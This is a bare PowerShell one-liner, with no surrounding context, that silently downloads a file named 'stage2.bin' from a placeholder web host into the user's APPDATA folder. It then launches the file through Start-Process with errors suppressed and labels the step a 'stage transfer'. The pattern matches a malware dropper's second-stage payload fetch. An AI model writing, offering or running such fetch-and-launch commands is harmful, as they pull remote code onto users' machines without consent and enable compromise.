
try { curl.exe -s -L -o "$env:APPDATA\stage2.bin" "http://example.com/stage2.bin"; Start-Process -FilePath "notepad.exe" -ArgumentList "$env:APPDATA\stage2.bin" -ErrorAction SilentlyContinue; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Stage transfer failed" }
